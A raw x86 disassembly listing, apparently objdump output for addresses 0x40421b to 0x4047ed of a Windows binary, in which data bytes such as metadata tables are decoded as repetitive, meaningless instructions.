  40421b:	2c 00                	sub    $0x0,%al
  40421d:	00 00                	add    %al,(%eax)
  40421f:	00 83 00 a8 00 9e    	add    %al,-0x61ff5800(%ebx)
  404225:	01 0f                	add    %ecx,(%edi)
  404227:	00 3c 2c             	add    %bh,(%esp,%ebp,1)
  40422a:	00 00                	add    %al,(%eax)
  40422c:	00 00                	add    %al,(%eax)
  40422e:	e1 01                	loope  0x404231
  404230:	1e                   	push   %ds
  404231:	0e                   	push   %cs
  404232:	06                   	push   %es
  404233:	00 0f                	add    %cl,(%edi)
  404235:	00 04 2d 00 00 00 00 	add    %al,0x0(,%ebp,1)
  40423c:	e1 01                	loope  0x40423f
  40423e:	40                   	inc    %eax
  40423f:	04 2d                	add    $0x2d,%al
  404241:	00 0f                	add    %cl,(%edi)
  404243:	00 14 2d 00 00 00 00 	add    %dl,0x0(,%ebp,1)
  40424a:	e1 01                	loope  0x40424d
  40424c:	1e                   	push   %ds
  40424d:	0e                   	push   %cs
  40424e:	06                   	push   %es
  40424f:	00 10                	add    %dl,(%eax)
  404251:	00 ec                	add    %ch,%ah
  404253:	2e 00 00             	add    %al,%cs:(%eax)
  404256:	00 00                	add    %al,(%eax)
  404258:	e1 01                	loope  0x40425b
  40425a:	40                   	inc    %eax
  40425b:	04 2d                	add    $0x2d,%al
  40425d:	00 10                	add    %dl,(%eax)
  40425f:	00 fc                	add    %bh,%ah
  404261:	2e 00 00             	add    %al,%cs:(%eax)
  404264:	00 00                	add    %al,(%eax)
  404266:	e1 01                	loope  0x404269
  404268:	1e                   	push   %ds
  404269:	0e                   	push   %cs
  40426a:	06                   	push   %es
  40426b:	00 11                	add    %dl,(%ecx)
  40426d:	00 c4                	add    %al,%ah
  40426f:	2f                   	das
  404270:	00 00                	add    %al,(%eax)
  404272:	00 00                	add    %al,(%eax)
  404274:	e1 01                	loope  0x404277
  404276:	40                   	inc    %eax
  404277:	04 2d                	add    $0x2d,%al
  404279:	00 11                	add    %dl,(%ecx)
  40427b:	00 d4                	add    %dl,%ah
  40427d:	2f                   	das
  40427e:	00 00                	add    %al,(%eax)
  404280:	00 00                	add    %al,(%eax)
  404282:	e1 01                	loope  0x404285
  404284:	1e                   	push   %ds
  404285:	0e                   	push   %cs
  404286:	06                   	push   %es
  404287:	00 12                	add    %dl,(%edx)
  404289:	00 04 34             	add    %al,(%esp,%esi,1)
  40428c:	00 00                	add    %al,(%eax)
  40428e:	00 00                	add    %al,(%eax)
  404290:	e1 01                	loope  0x404293
  404292:	40                   	inc    %eax
  404293:	04 2d                	add    $0x2d,%al
  404295:	00 12                	add    %dl,(%edx)
  404297:	00 14 34             	add    %dl,(%esp,%esi,1)
  40429a:	00 00                	add    %al,(%eax)
  40429c:	00 00                	add    %al,(%eax)
  40429e:	e1 01                	loope  0x4042a1
  4042a0:	1e                   	push   %ds
  4042a1:	0e                   	push   %cs
  4042a2:	06                   	push   %es
  4042a3:	00 13                	add    %dl,(%ebx)
  4042a5:	00 d4                	add    %dl,%ah
  4042a7:	34 00                	xor    $0x0,%al
  4042a9:	00 00                	add    %al,(%eax)
  4042ab:	00 e1                	add    %ah,%cl
  4042ad:	01 40 04             	add    %eax,0x4(%eax)
  4042b0:	2d 00 13 00 e4       	sub    $0xe4001300,%eax
  4042b5:	34 00                	xor    $0x0,%al
  4042b7:	00 00                	add    %al,(%eax)
  4042b9:	00 e1                	add    %ah,%cl
  4042bb:	01 1e                	add    %ebx,(%esi)
  4042bd:	0e                   	push   %cs
  4042be:	06                   	push   %es
  4042bf:	00 14 00             	add    %dl,(%eax,%eax,1)
  4042c2:	ac                   	lods   %ds:(%esi),%al
  4042c3:	35 00 00 00 00       	xor    $0x0,%eax
  4042c8:	e1 01                	loope  0x4042cb
  4042ca:	40                   	inc    %eax
  4042cb:	04 2d                	add    $0x2d,%al
  4042cd:	00 14 00             	add    %dl,(%eax,%eax,1)
  4042d0:	bc 35 00 00 00       	mov    $0x35,%esp
  4042d5:	00 e1                	add    %ah,%cl
  4042d7:	01 1e                	add    %ebx,(%esi)
  4042d9:	0e                   	push   %cs
  4042da:	06                   	push   %es
  4042db:	00 15 00 f0 36 00    	add    %dl,0x36f000
  4042e1:	00 00                	add    %al,(%eax)
  4042e3:	00 e1                	add    %ah,%cl
  4042e5:	01 40 04             	add    %eax,0x4(%eax)
  4042e8:	2d 00 15 00 00       	sub    $0x1500,%eax
  4042ed:	37                   	aaa
  4042ee:	00 00                	add    %al,(%eax)
  4042f0:	00 00                	add    %al,(%eax)
  4042f2:	e1 01                	loope  0x4042f5
  4042f4:	1e                   	push   %ds
  4042f5:	0e                   	push   %cs
  4042f6:	06                   	push   %es
  4042f7:	00 16                	add    %dl,(%esi)
  4042f9:	00 b4 37 00 00 00 00 	add    %dh,0x0(%edi,%esi,1)
  404300:	e1 01                	loope  0x404303
  404302:	40                   	inc    %eax
  404303:	04 2d                	add    $0x2d,%al
  404305:	00 16                	add    %dl,(%esi)
  404307:	00 c4                	add    %al,%ah
  404309:	37                   	aaa
  40430a:	00 00                	add    %al,(%eax)
  40430c:	00 00                	add    %al,(%eax)
  40430e:	e1 01                	loope  0x404311
  404310:	1e                   	push   %ds
  404311:	0e                   	push   %cs
  404312:	06                   	push   %es
  404313:	00 17                	add    %dl,(%edi)
  404315:	00 78 38             	add    %bh,0x38(%eax)
  404318:	00 00                	add    %al,(%eax)
  40431a:	00 00                	add    %al,(%eax)
  40431c:	e1 01                	loope  0x40431f
  40431e:	40                   	inc    %eax
  40431f:	04 2d                	add    $0x2d,%al
  404321:	00 17                	add    %dl,(%edi)
  404323:	00 88 38 00 00 00    	add    %cl,0x38(%eax)
  404329:	00 e1                	add    %ah,%cl
  40432b:	01 1e                	add    %ebx,(%esi)
  40432d:	0e                   	push   %cs
  40432e:	06                   	push   %es
  40432f:	00 18                	add    %bl,(%eax)
  404331:	00 48 39             	add    %cl,0x39(%eax)
  404334:	00 00                	add    %al,(%eax)
  404336:	00 00                	add    %al,(%eax)
  404338:	e1 01                	loope  0x40433b
  40433a:	40                   	inc    %eax
  40433b:	04 2d                	add    $0x2d,%al
  40433d:	00 18                	add    %bl,(%eax)
  40433f:	00 58 39             	add    %bl,0x39(%eax)
  404342:	00 00                	add    %al,(%eax)
  404344:	00 00                	add    %al,(%eax)
  404346:	e1 01                	loope  0x404349
  404348:	1e                   	push   %ds
  404349:	0e                   	push   %cs
  40434a:	06                   	push   %es
  40434b:	00 19                	add    %bl,(%ecx)
  40434d:	00 28                	add    %ch,(%eax)
  40434f:	3a 00                	cmp    (%eax),%al
  404351:	00 00                	add    %al,(%eax)
  404353:	00 e1                	add    %ah,%cl
  404355:	01 40 04             	add    %eax,0x4(%eax)
  404358:	2d 00 19 00 00       	sub    $0x1900,%eax
  40435d:	00 01                	add    %al,(%ecx)
  40435f:	00 63 07             	add    %ah,0x7(%ebx)
  404362:	00 00                	add    %al,(%eax)
  404364:	01 00                	add    %eax,(%eax)
  404366:	20 04 00             	and    %al,(%eax,%eax,1)
  404369:	00 01                	add    %al,(%ecx)
  40436b:	00 a5 03 00 00 01    	add    %ah,0x1000003(%ebp)
  404371:	00 f2                	add    %dh,%dl
  404373:	08 00                	or     %al,(%eax)
  404375:	00 01                	add    %al,(%ecx)
  404377:	00 ab 03 00 00 02    	add    %ch,0x2000003(%ebx)
  40437d:	00 d6                	add    %dl,%dh
  40437f:	09 00                	or     %eax,(%eax)
  404381:	00 03                	add    %al,(%ebx)
  404383:	00 fa                	add    %bh,%dl
  404385:	0c 00                	or     $0x0,%al
  404387:	00 04 00             	add    %al,(%eax,%eax,1)
  40438a:	3f                   	aas
  40438b:	09 00                	or     %eax,(%eax)
  40438d:	00 01                	add    %al,(%ecx)
  40438f:	00 39                	add    %bh,(%ecx)
  404391:	0d 00 00 01 00       	or     $0x10000,%eax
  404396:	70 0a                	jo     0x4043a2
  404398:	00 00                	add    %al,(%eax)
  40439a:	02 00                	add    (%eax),%al
  40439c:	91                   	xchg   %eax,%ecx
  40439d:	07                   	pop    %es
  40439e:	00 00                	add    %al,(%eax)
  4043a0:	01 00                	add    %eax,(%eax)
  4043a2:	70 0a                	jo     0x4043ae
  4043a4:	00 00                	add    %al,(%eax)
  4043a6:	02 00                	add    (%eax),%al
  4043a8:	91                   	xchg   %eax,%ecx
  4043a9:	07                   	pop    %es
  4043aa:	00 00                	add    %al,(%eax)
  4043ac:	01 00                	add    %eax,(%eax)
  4043ae:	dd 07                	fldl   (%edi)
  4043b0:	00 00                	add    %al,(%eax)
  4043b2:	01 00                	add    %eax,(%eax)
  4043b4:	50                   	push   %eax
  4043b5:	04 00                	add    $0x0,%al
  4043b7:	00 01                	add    %al,(%ecx)
  4043b9:	00 50 04             	add    %dl,0x4(%eax)
  4043bc:	00 00                	add    %al,(%eax)
  4043be:	01 00                	add    %eax,(%eax)
  4043c0:	50                   	push   %eax
  4043c1:	04 00                	add    $0x0,%al
  4043c3:	00 01                	add    %al,(%ecx)
  4043c5:	00 50 04             	add    %dl,0x4(%eax)
  4043c8:	00 00                	add    %al,(%eax)
  4043ca:	01 00                	add    %eax,(%eax)
  4043cc:	50                   	push   %eax
  4043cd:	04 00                	add    $0x0,%al
  4043cf:	00 01                	add    %al,(%ecx)
  4043d1:	00 50 04             	add    %dl,0x4(%eax)
  4043d4:	00 00                	add    %al,(%eax)
  4043d6:	01 00                	add    %eax,(%eax)
  4043d8:	50                   	push   %eax
  4043d9:	04 00                	add    $0x0,%al
  4043db:	00 01                	add    %al,(%ecx)
  4043dd:	00 50 04             	add    %dl,0x4(%eax)
  4043e0:	00 00                	add    %al,(%eax)
  4043e2:	01 00                	add    %eax,(%eax)
  4043e4:	50                   	push   %eax
  4043e5:	04 00                	add    $0x0,%al
  4043e7:	00 01                	add    %al,(%ecx)
  4043e9:	00 50 04             	add    %dl,0x4(%eax)
  4043ec:	00 00                	add    %al,(%eax)
  4043ee:	01 00                	add    %eax,(%eax)
  4043f0:	50                   	push   %eax
  4043f1:	04 0c                	add    $0xc,%al
  4043f3:	00 c9                	add    %cl,%cl
  4043f5:	00 0d 00 c9 00 0e    	add    %cl,0xe00c900
  4043fb:	00 c9                	add    %cl,%cl
  4043fd:	00 0f                	add    %cl,(%edi)
  4043ff:	00 c9                	add    %cl,%cl
  404401:	00 10                	add    %dl,(%eax)
  404403:	00 c9                	add    %cl,%cl
  404405:	00 11                	add    %dl,(%ecx)
  404407:	00 c9                	add    %cl,%cl
  404409:	00 12                	add    %dl,(%edx)
  40440b:	00 c9                	add    %cl,%cl
  40440d:	00 13                	add    %dl,(%ebx)
  40440f:	00 c9                	add    %cl,%cl
  404411:	00 14 00             	add    %dl,(%eax,%eax,1)
  404414:	c9                   	leave
  404415:	00 15 00 c9 00 16    	add    %dl,0x1600c900
  40441b:	00 c9                	add    %cl,%cl
  40441d:	00 09                	add    %cl,(%ecx)
  40441f:	00 34 0b             	add    %dh,(%ebx,%ecx,1)
  404422:	01 00                	add    %eax,(%eax)
  404424:	11 00                	adc    %eax,(%eax)
  404426:	34 0b                	xor    $0xb,%al
  404428:	06                   	push   %es
  404429:	00 19                	add    %bl,(%ecx)
  40442b:	00 34 0b             	add    %dh,(%ebx,%ecx,1)
  40442e:	0a 00                	or     (%eax),%al
  404430:	29 00                	sub    %eax,(%eax)
  404432:	34 0b                	xor    $0xb,%al
  404434:	10 00                	adc    %al,(%eax)
  404436:	31 00                	xor    %eax,(%eax)
  404438:	34 0b                	xor    $0xb,%al
  40443a:	10 00                	adc    %al,(%eax)
  40443c:	39 00                	cmp    %eax,(%eax)
  40443e:	34 0b                	xor    $0xb,%al
  404440:	10 00                	adc    %al,(%eax)
  404442:	41                   	inc    %ecx
  404443:	00 34 0b             	add    %dh,(%ebx,%ecx,1)
  404446:	10 00                	adc    %al,(%eax)
  404448:	49                   	dec    %ecx
  404449:	00 34 0b             	add    %dh,(%ebx,%ecx,1)
  40444c:	10 00                	adc    %al,(%eax)
  40444e:	51                   	push   %ecx
  40444f:	00 34 0b             	add    %dh,(%ebx,%ecx,1)
  404452:	10 00                	adc    %al,(%eax)
  404454:	59                   	pop    %ecx
  404455:	00 34 0b             	add    %dh,(%ebx,%ecx,1)
  404458:	10 00                	adc    %al,(%eax)
  40445a:	61                   	popa
  40445b:	00 34 0b             	add    %dh,(%ebx,%ecx,1)
  40445e:	15 00 69 00 34       	adc    $0x34006900,%eax
  404463:	0b 10                	or     (%eax),%edx
  404465:	00 71 00             	add    %dh,0x0(%ecx)
  404468:	34 0b                	xor    $0xb,%al
  40446a:	10 00                	adc    %al,(%eax)
  40446c:	79 00                	jns    0x40446e
  40446e:	34 0b                	xor    $0xb,%al
  404470:	10 00                	adc    %al,(%eax)
  404472:	89 00                	mov    %eax,(%eax)
  404474:	34 0b                	xor    $0xb,%al
  404476:	06                   	push   %es
  404477:	00 91 00 34 0b 1a    	add    %dl,0x1a0b3400(%ecx)
  40447d:	00 99 00 34 0b 06    	add    %bl,0x60b3400(%ecx)
  404483:	00 a1 00 34 0b 06    	add    %ah,0x60b3400(%ecx)
  404489:	00 c1                	add    %al,%cl
  40448b:	00 34 0b             	add    %dh,(%ebx,%ecx,1)
  40448e:	20 00                	and    %al,(%eax)
  404490:	29 01                	sub    %eax,(%ecx)
  404492:	34 0b                	xor    $0xb,%al
  404494:	26 00 91 01 1e 0e 06 	add    %dl,%es:0x60e1e01(%ecx)
  40449b:	00 91 01 40 04 2d    	add    %dl,0x2d044001(%ecx)
  4044a1:	00 b1 01 34 0b 06    	add    %dh,0x60b3401(%ecx)
  4044a7:	00 d1                	add    %dl,%cl
  4044a9:	01 1a                	add    %ebx,(%edx)
  4044ab:	0c 34                	or     $0x34,%al
  4044ad:	00 d1                	add    %dl,%cl
  4044af:	01 63 0d             	add    %esp,0xd(%ebx)
  4044b2:	38 00                	cmp    %al,(%eax)
  4044b4:	d1 01                	roll   $1,(%ecx)
  4044b6:	f7 09 3d 00 81 00    	testl  $0x81003d,(%ecx)
  4044bc:	34 0b                	xor    $0xb,%al
  4044be:	06                   	push   %es
  4044bf:	00 21                	add    %ah,(%ecx)
  4044c1:	01 d8                	add    %ebx,%eax
  4044c3:	03 43 00             	add    0x0(%ebx),%eax
  4044c6:	21 01                	and    %eax,(%ecx)
  4044c8:	8f                   	(bad)
  4044c9:	0e                   	push   %cs
  4044ca:	4c                   	dec    %esp
  4044cb:	00 a9 00 34 0b 52    	add    %ch,0x520b3400(%ecx)
  4044d1:	00 c9                	add    %cl,%cl
  4044d3:	00 34 0b             	add    %dh,(%ebx,%ecx,1)
  4044d6:	06                   	push   %es
  4044d7:	00 e1                	add    %ah,%cl
  4044d9:	01 66 03             	add    %esp,0x3(%esi)
  4044dc:	5a                   	pop    %edx
  4044dd:	00 d1                	add    %dl,%cl
  4044df:	00 34 0b             	add    %dh,(%ebx,%ecx,1)
  4044e2:	06                   	push   %es
  4044e3:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4044e6:	d5 04                	aad    $0x4
  4044e8:	70 00                	jo     0x4044ea
  4044ea:	0c 00                	or     $0x0,%al
  4044ec:	ef                   	out    %eax,(%dx)
  4044ed:	0d 7a 00 0c 00       	or     $0xc007a,%eax
  4044f2:	48                   	dec    %eax
  4044f3:	08 87 00 a9 01 d5    	or     %al,-0x2afe5700(%edi)
  4044f9:	04 96                	add    $0x96,%al
  4044fb:	00 a9 01 ef 0d 7a    	add    %ch,0x7a0def01(%ecx)
  404501:	00 a9 01 48 08 a1    	add    %ch,-0x5ef7b7ff(%ecx)
  404507:	00 14 00             	add    %dl,(%eax,%eax,1)
  40450a:	d5 04                	aad    $0x4
  40450c:	70 00                	jo     0x40450e
  40450e:	14 00                	adc    $0x0,%al
  404510:	ef                   	out    %eax,(%dx)
  404511:	0d 7a 00 14 00       	or     $0x14007a,%eax
  404516:	48                   	dec    %eax
  404517:	08 87 00 c9 01 d5    	or     %al,-0x2afe3700(%edi)
  40451d:	04 d1                	add    $0xd1,%al
  40451f:	00 c9                	add    %cl,%cl
  404521:	01 ef                	add    %ebp,%edi
  404523:	0d 7a 00 e9 01       	or     $0x1e9007a,%eax
  404528:	cd 04                	int    $0x4
  40452a:	06                   	push   %es
  40452b:	00 d1                	add    %dl,%cl
  40452d:	00 cd                	add    %cl,%ch
  40452f:	04 15                	add    $0x15,%al
  404531:	00 f1                	add    %dh,%cl
  404533:	01 34 0b             	add    %esi,(%ebx,%ecx,1)
  404536:	06                   	push   %es
  404537:	00 e1                	add    %ah,%cl
  404539:	00 34 0b             	add    %dh,(%ebx,%ecx,1)
  40453c:	06                   	push   %es
  40453d:	00 09                	add    %cl,(%ecx)
  40453f:	01 34 0b             	add    %esi,(%ebx,%ecx,1)
  404542:	06                   	push   %es
  404543:	00 11                	add    %dl,(%ecx)
  404545:	01 34 0b             	add    %esi,(%ebx,%ecx,1)
  404548:	06                   	push   %es
  404549:	00 f9                	add    %bh,%cl
  40454b:	00 34 0b             	add    %dh,(%ebx,%ecx,1)
  40454e:	06                   	push   %es
  40454f:	00 f1                	add    %dh,%cl
  404551:	00 34 0b             	add    %dh,(%ebx,%ecx,1)
  404554:	06                   	push   %es
  404555:	00 e9                	add    %ch,%cl
  404557:	00 34 0b             	add    %dh,(%ebx,%ecx,1)
  40455a:	06                   	push   %es
  40455b:	00 01                	add    %al,(%ecx)
  40455d:	01 34 0b             	add    %esi,(%ebx,%ecx,1)
  404560:	fa                   	cli
  404561:	00 19                	add    %bl,(%ecx)
  404563:	01 34 0b             	add    %esi,(%ebx,%ecx,1)
  404566:	fa                   	cli
  404567:	00 f9                	add    %bh,%cl
  404569:	01 f5                	add    %esi,%ebp
  40456b:	0d 06 00 71 01       	or     $0x1710006,%eax
  404570:	ef                   	out    %eax,(%dx)
  404571:	02 00                	add    (%eax),%al
  404573:	01 f9                	add    %edi,%ecx
  404575:	01 eb                	add    %ebp,%ebx
  404577:	0a 09                	or     (%ecx),%cl
  404579:	01 f9                	add    %edi,%ecx
  40457b:	01 84 0c 10 01 01 02 	add    %eax,0x2010110(%esp,%ecx,1)
  404582:	28 03                	sub    %al,(%ebx)
  404584:	16                   	push   %ss
  404585:	01 f9                	add    %edi,%ecx
  404587:	01 3f                	add    %edi,(%edi)
  404589:	08 1d 01 11 02 34    	or     %bl,0x34021101
  40458f:	0b 24 01             	or     (%ecx,%eax,1),%esp
  404592:	f9                   	stc
  404593:	01 50 09             	add    %edx,0x9(%eax)
  404596:	2a 01                	sub    (%ecx),%al
  404598:	f9                   	stc
  404599:	01 17                	add    %edx,(%edi)
  40459b:	04 10                	add    $0x10,%al
  40459d:	00 19                	add    %bl,(%ecx)
  40459f:	02 34 0b             	add    (%ebx,%ecx,1),%dh
  4045a2:	24 01                	and    $0x1,%al
  4045a4:	f9                   	stc
  4045a5:	01 7b 07             	add    %edi,0x7(%ebx)
  4045a8:	31 01                	xor    %eax,(%ecx)
  4045aa:	f9                   	stc
  4045ab:	01 49 0e             	add    %ecx,0xe(%ecx)
  4045ae:	01 00                	add    %eax,(%eax)
  4045b0:	71 01                	jno    0x4045b3
  4045b2:	05 05 38 01 09       	add    $0x9013805,%eax
  4045b7:	01 f9                	add    %edi,%ecx
  4045b9:	0a 09                	or     (%ecx),%cl
  4045bb:	01 f9                	add    %edi,%ecx
  4045bd:	01 d2                	add    %edx,%edx
  4045bf:	0a 3e                	or     (%esi),%bh
  4045c1:	01 11                	add    %edx,(%ecx)
  4045c3:	01 15 0b 09 01 11    	add    %edx,0x1101090b
  4045c9:	01 28                	add    %ebp,(%eax)
  4045cb:	0d 01 00 11 01       	or     $0x1110001,%eax
  4045d0:	02 0d 01 00 11 01    	add    0x1110001,%cl
  4045d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4045d7:	04 45                	add    $0x45,%al
  4045d9:	01 71 01             	add    %esi,0x1(%ecx)
  4045dc:	ba 0d 38 01 11       	mov    $0x1101380d,%edx
  4045e1:	01 f9                	add    %edi,%ecx
  4045e3:	0a 09                	or     (%ecx),%cl
  4045e5:	01 11                	add    %edx,(%ecx)
  4045e7:	01 07                	add    %eax,(%edi)
  4045e9:	0b 09                	or     (%ecx),%ecx
  4045eb:	01 31                	add    %esi,(%ecx)
  4045ed:	02 34 0b             	add    (%ebx,%ecx,1),%dh
  4045f0:	4c                   	dec    %esp
  4045f1:	01 f9                	add    %edi,%ecx
  4045f3:	01 e6                	add    %esp,%esi
  4045f5:	0d 55 01 f9 01       	or     $0x1f90155,%eax
  4045fa:	dd 0a                	fisttpll (%edx)
  4045fc:	09 01                	or     %eax,(%ecx)
  4045fe:	f9                   	stc
  4045ff:	01 3b                	add    %edi,(%ebx)
  404601:	0e                   	push   %cs
  404602:	10 00                	adc    %al,(%eax)
  404604:	f1                   	int1
  404605:	00 28                	add    %ch,(%eax)
  404607:	0d 01 00 f1 00       	or     $0xf10001,%eax
  40460c:	f9                   	stc
  40460d:	0a 09                	or     (%ecx),%cl
  40460f:	01 41 02             	add    %eax,0x2(%ecx)
  404612:	34 0b                	xor    $0xb,%al
  404614:	5c                   	pop    %esp
  404615:	01 f9                	add    %edi,%ecx
  404617:	01 35 08 62 01 e9    	add    %esi,0xe9016208
  40461d:	00 28                	add    %ch,(%eax)
  40461f:	0d 01 00 e9 00       	or     $0xe90001,%eax
  404624:	f9                   	stc
  404625:	0a 09                	or     (%ecx),%cl
  404627:	01 e9                	add    %ebp,%ecx
  404629:	00 ca                	add    %cl,%dl
  40462b:	0d 69 01 01 01       	or     $0x1010169,%eax
  404630:	28 0d 01 00 01 01    	sub    %cl,0x1010001
  404636:	9b                   	fwait
  404637:	08 70 01             	or     %dh,0x1(%eax)
  40463a:	01 01                	add    %eax,(%ecx)
  40463c:	40                   	inc    %eax
  40463d:	07                   	pop    %es
  40463e:	77 01                	ja     0x404641
  404640:	01 01                	add    %eax,(%ecx)
  404642:	93                   	xchg   %eax,%ebx
  404643:	07                   	pop    %es
  404644:	15 00 19 01 40       	adc    $0x40011900,%eax
  404649:	07                   	pop    %es
  40464a:	77 01                	ja     0x40464d
  40464c:	19 01                	sbb    %eax,(%ecx)
  40464e:	b0 08                	mov    $0x8,%al
  404650:	16                   	push   %ss
  404651:	01 19                	add    %ebx,(%ecx)
  404653:	01 ac 07 15 00 59 02 	add    %ebp,0x2590015(%edi,%eax,1)
  40465a:	34 0b                	xor    $0xb,%al
  40465c:	7c 01                	jl     0x40465f
  40465e:	51                   	push   %ecx
  40465f:	02 d0                	add    %al,%dl
  404661:	0c 82                	or     $0x82,%al
  404663:	01 51 02             	add    %edx,0x2(%ecx)
  404666:	8d 03                	lea    (%ebx),%eax
  404668:	89 01                	mov    %eax,(%ecx)
  40466a:	71 01                	jno    0x40466d
  40466c:	05 08 38 01 d1       	add    $0xd1013808,%eax
  404671:	00 84 07 31 01 d1 00 	add    %al,0xd10131(%edi,%eax,1)
  404678:	f9                   	stc
  404679:	03 90 01 d1 00 61    	add    0x6100d101(%eax),%edx
  40467f:	0e                   	push   %cs
  404680:	15 00 d1 00 23       	adc    $0x2300d100,%eax
  404685:	09 15 00 d1 00 b2    	or     %edx,0xb200d100
  40468b:	09 97 01 f9 01 03    	or     %edx,0x301f901(%edi)
  404691:	0e                   	push   %cs
  404692:	15 00 f9 01 10       	adc    $0x1001f900,%eax
  404697:	0e                   	push   %cs
  404698:	06                   	push   %es
  404699:	00 f9                	add    %bh,%cl
  40469b:	01 2c 03             	add    %ebp,(%ebx,%eax,1)
  40469e:	9e                   	sahf
  40469f:	01 59 01             	add    %ebx,0x1(%ecx)
  4046a2:	34 0b                	xor    $0xb,%al
  4046a4:	5c                   	pop    %esp
  4046a5:	01 f9                	add    %edi,%ecx
  4046a7:	01 b3 03 a2 01 d1    	add    %esi,-0x2efe5dfd(%ebx)
  4046ad:	01 52 0d             	add    %edx,0xd(%edx)
  4046b0:	34 00                	xor    $0x0,%al
  4046b2:	61                   	popa
  4046b3:	01 34 0b             	add    %esi,(%ebx,%ecx,1)
  4046b6:	10 00                	adc    %al,(%eax)
  4046b8:	69 01 34 0b 06 00    	imul   $0x60b34,(%ecx),%eax
  4046be:	61                   	popa
  4046bf:	01 81 08 ba 01 71    	add    %eax,0x7101ba08(%ecx)
  4046c5:	01 e9                	add    %ebp,%ecx
  4046c7:	02 c2                	add    %dl,%al
  4046c9:	01 71 01             	add    %esi,0x1(%ecx)
  4046cc:	cb                   	lret
  4046cd:	02 c2                	add    %dl,%al
  4046cf:	01 71 01             	add    %esi,0x1(%ecx)
  4046d2:	bf 02 c2 01 81       	mov    $0x8101c202,%edi
  4046d7:	02 22                	add    (%edx),%ah
  4046d9:	07                   	pop    %es
  4046da:	c6 01 89             	movb   $0x89,(%ecx)
  4046dd:	02 fb                	add    %bl,%bh
  4046df:	07                   	pop    %es
  4046e0:	cb                   	lret
  4046e1:	01 89 02 47 0d cb    	add    %ecx,-0x34f2b8fe(%ecx)
  4046e7:	01 69 01             	add    %ebp,0x1(%ecx)
  4046ea:	87 0e                	xchg   %ecx,(%esi)
  4046ec:	cf                   	iret
  4046ed:	01 79 01             	add    %edi,0x1(%ecx)
  4046f0:	23 03                	and    (%ebx),%eax
  4046f2:	e5 01                	in     $0x1,%eax
  4046f4:	79 01                	jns    0x4046f7
  4046f6:	67 04 ed             	addr16 add $0xed,%al
  4046f9:	01 21                	add    %esp,(%ecx)
  4046fb:	01 ae 0e f4 01 21    	add    %ebp,0x2101f40e(%esi)
  404701:	01 73 03             	add    %esi,0x3(%ebx)
  404704:	fe 01                	incb   (%ecx)
  404706:	99                   	cltd
  404707:	02 b3 03 08 02 79    	add    0x79020803(%ebx),%dh
  40470d:	01 3a                	add    %edi,(%edx)
  40470f:	0c 0f                	or     $0xf,%al
  404711:	02 81 01 ae 0e 16    	add    0x160eae01(%ecx),%al
  404717:	02 a1 02 21 0d 34    	add    0x340d2102(%ecx),%ah
  40471d:	02 1c 00             	add    (%eax,%eax,1),%bl
  404720:	34 0b                	xor    $0xb,%al
  404722:	5c                   	pop    %esp
  404723:	01 39                	add    %edi,(%ecx)
  404725:	01 f7                	add    %esi,%edi
  404727:	09 51 02             	or     %edx,0x2(%ecx)
  40472a:	24 00                	and    $0x0,%al
  40472c:	c7                   	(bad)
  40472d:	0a 70 02             	or     0x2(%eax),%dh
  404730:	2c 00                	sub    $0x0,%al
  404732:	56                   	push   %esi
  404733:	03 9e 01 0c 00 3f    	add    0x3f000c01(%esi),%ebx
  404739:	03 82 02 2c 00 92    	add    -0x6dffd3fe(%edx),%eax
  40473f:	0d 99 02 0c 00       	or     $0xc0299,%eax
  404744:	de 09                	fimuls (%ecx)
  404746:	9e                   	sahf
  404747:	02 0c 00             	add    (%eax,%eax,1),%cl
  40474a:	9c                   	pushf
  40474b:	0d a5 02 0c 00       	or     $0xc02a5,%eax
  404750:	40                   	inc    %eax
  404751:	04 2d                	add    $0x2d,%al
  404753:	00 34 00             	add    %dh,(%eax,%eax,1)
  404756:	34 0b                	xor    $0xb,%al
  404758:	5c                   	pop    %esp
  404759:	01 39                	add    %edi,(%ecx)
  40475b:	01 c7                	add    %eax,%edi
  40475d:	0a c0                	or     %al,%al
  40475f:	02 99 01 56 03 9e    	add    -0x61fca9ff(%ecx),%bl
  404765:	01 a9 01 3f 03 82    	add    %ebp,-0x7dfcc0ff(%ecx)
  40476b:	02 99 01 92 0d 06    	add    0x60d9201(%ecx),%bl
  404771:	00 e9                	add    %ch,%cl
  404773:	00 2c 07             	add    %ch,(%edi,%eax,1)
  404776:	cb                   	lret
  404777:	01 e9                	add    %ebp,%ecx
  404779:	00 36                	add    %dh,(%esi)
  40477b:	07                   	pop    %es
  40477c:	01 00                	add    %eax,(%eax)
  40477e:	39 01                	cmp    %eax,(%ecx)
  404780:	81 0e ce 02 a9 01    	orl    $0x1a902ce,(%esi)
  404786:	de 09                	fimuls (%ecx)
  404788:	9e                   	sahf
  404789:	02 a9 01 9c 0d 06    	add    0x60d9c01(%ecx),%ch
  40478f:	00 a9 01 40 04 2d    	add    %ch,0x2d044001(%ecx)
  404795:	00 3c 00             	add    %bh,(%eax,%eax,1)
  404798:	34 0b                	xor    $0xb,%al
  40479a:	5c                   	pop    %esp
  40479b:	01 44 00 c7          	add    %eax,-0x39(%eax,%eax,1)
  40479f:	0a 70 02             	or     0x2(%eax),%dh
  4047a2:	4c                   	dec    %esp
  4047a3:	00 56 03             	add    %dl,0x3(%esi)
  4047a6:	9e                   	sahf
  4047a7:	01 14 00             	add    %edx,(%eax,%eax,1)
  4047aa:	3f                   	aas
  4047ab:	03 82 02 4c 00 92    	add    -0x6dffb3fe(%edx),%eax
  4047b1:	0d 99 02 14 00       	or     $0x140299,%eax
  4047b6:	de 09                	fimuls (%ecx)
  4047b8:	9e                   	sahf
  4047b9:	02 14 00             	add    (%eax,%eax,1),%dl
  4047bc:	9c                   	pushf
  4047bd:	0d a5 02 14 00       	or     $0x1402a5,%eax
  4047c2:	40                   	inc    %eax
  4047c3:	04 2d                	add    $0x2d,%al
  4047c5:	00 b1 02 11 09 2e    	add    %dh,0x2e091102(%ecx)
  4047cb:	03 b1 02 9c 0e 34    	add    0x340e9c02(%ecx),%esi
  4047d1:	03 b9 02 25 04 38    	add    0x38042502(%ecx),%edi
  4047d7:	03 39                	add    (%ecx),%edi
  4047d9:	01 f7                	add    %esi,%edi
  4047db:	09 56 03             	or     %edx,0x3(%esi)
  4047de:	c1 02 44             	roll   $0x44,(%edx)
  4047e1:	0e                   	push   %cs
  4047e2:	8f 03                	pop    (%ebx)
  4047e4:	c9                   	leave
  4047e5:	01 3f                	add    %edi,(%edi)
  4047e7:	03 82 02 c9 01 de    	add    -0x21fe36fe(%edx),%eax
  4047ed:	09 9e 02 c9 01 9c    	or     %ebx,-0x63fe36fe(%esi)
